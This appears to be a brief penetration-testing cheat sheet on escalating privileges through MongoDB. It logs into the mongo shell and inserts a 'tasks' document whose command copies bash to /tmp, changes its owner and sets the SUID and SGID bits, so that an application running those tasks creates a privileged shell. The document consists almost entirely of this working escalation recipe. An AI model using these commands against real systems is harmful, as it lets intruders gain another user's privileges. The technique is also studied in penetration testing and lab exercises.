# Execute commands within a MongoDB shell

## Requirements: An application that uses the database runs as the owner we want to escalate

## Steps:

#### 1) 

    mongo -p -u USER DATABASE

#### 2) Copies the bash binary and gives ownership and SGID set with the context of the user that the database is running

    db.tasks.insert({"cmd":"/bin/cp /bin/bash /tmp/bash; /bin/chown tom:admin /tmp/bash; chmod g+s /tmp/bash; chmod u+s /tmp/bash"}); 
